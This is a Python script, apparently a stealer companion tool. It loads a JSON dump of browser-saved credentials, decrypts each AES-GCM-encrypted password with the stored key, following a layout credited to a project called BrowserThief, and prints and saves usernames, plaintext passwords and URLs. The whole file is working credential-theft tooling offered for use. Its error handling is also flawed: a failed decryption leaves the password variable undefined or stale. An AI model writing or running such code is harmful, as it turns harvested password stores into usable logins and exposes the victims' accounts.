import json
from Cryptodome.Cipher import AES
import base64
import os

def intro():
    ascii_art = """
      *****+++++             ---   +---------          
   ******+++==+++++=========--  ***++=------           
  ***+======================= *****++==                
##*+++++++++++++++++++*####  ******++                  
##*+       *+***+++ ######  #*++++*++                  
##                 ***###   **+++++++                  
                  ***####  ****++++++                  
                 ***#####  ****+=====                  
                ++******#  ******====                  
                ++*******  *******+==                  
               ===+******  *********+                  
               ====******   *********                  
               -=--=*****   =********                  
            --------=****   -==+*****                  
       ==-==------====***   -===++***                  
      =================+*   ====+++**                  
           +++++=========   -===+++**                  
              ++++====+++   *********                  
               ***+====++   ********                   
          ------+**+++++*   ********                   
         --------+*+++++*   ****+++                    
             ----=**++++   *****++                     
               ---++++++  *****+*                      
                -=++***  ******                        
                -===**  *****                          
                -===*  ****        ++++                
               -----  **********+++++++++=====         
              ===== ##**********+++++++++========   ---
            ++++++####***++++++++++++****+++=======--- 
          ++++++*###+========++++++++***********====   
        #*******#+-                ++*********####     
       ##****                           ******##       
       #                                   ***         
"""



    print("\033[31m" + ascii_art + "\033[0m")

def socials():
    print("All my links: https://linktr.ee/lucasquintao.it") 


def decrypt():

    fileName = input("Enter the file name with the passwords to decrypt: ")
    print("\n")
    output_file = "decrypted_passwords.txt"
    if not os.path.exists(fileName):
        print("The file doesn't exist")
        return 0
    # Read JSON file with UTF-16 encoding
    with open(fileName, "r", encoding="utf-16") as file:
        data = json.load(file)  # Load raw JSON

    # Ensure all values are parsed as dictionaries
    formatted_json = {}
    for key, value in data.items():
        try:
            # Ensure the value is properly converted to a dictionary
            formatted_json[key] = json.loads(value) if isinstance(value, str) else value # to check if value is a string before parsing it, if it's a dictionary it will keep the value
        except json.JSONDecodeError:
            formatted_json[key] = value  # If parsing fails, keep as-is

    with open(output_file, "w", encoding="utf-8") as output:
        for id, value in formatted_json.items():
            if isinstance(value, dict):  # Ensure it's a dictionary before accessing keys

                encryptedPassword = value.get('password') # Credits for decryption function: https://github.com/ScribblerCoder/BrowserThief/blob/main/Web/src/application/main.py
                key = value.get('key')
                key = base64.b64decode(key)
                iv = base64.b64decode(encryptedPassword)[3:15]
                encryptedPassword = base64.b64decode(encryptedPassword)[15:-16]
                
                try:
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    decryptedPassword = cipher.decrypt(encryptedPassword).decode('utf-8')
                except Exception as error:
                    print("An exception occurred:", error)
                record = (
                        f"Record ID: {id}\n"
                        f"Username: {value.get('username', 'N/A')}\n"
                        f"Password: {value.get('password', 'N/A')}\n"
                        f"Decrypted password: {decryptedPassword}\n"
                        f"Key: {value.get('key', 'N/A')}\n"
                        f"URL: {value.get('url', 'N/A')}\n"
                        f"{'-' * 40}\n")
                
                print(f"Record ID: {id}")
                print(f"\033[31mUsername: {value.get('username', 'N/A')}\033[0m")
                print(f"Encrypted password: {value.get('password', 'N/A')}")
                print(f"Key: {value.get('key', 'N/A')}")
                print(f"\033[31mDecrypted password: {decryptedPassword}\033[0m")
                print(f"\033[31mURL: {value.get('url', 'N/A')}\033[0m")
                print("-" * 40)

                output.write(record)

        print(f"\033[92mDecrypted passwords saved to {output_file}\033[0m")
        


intro()
socials()
decrypt()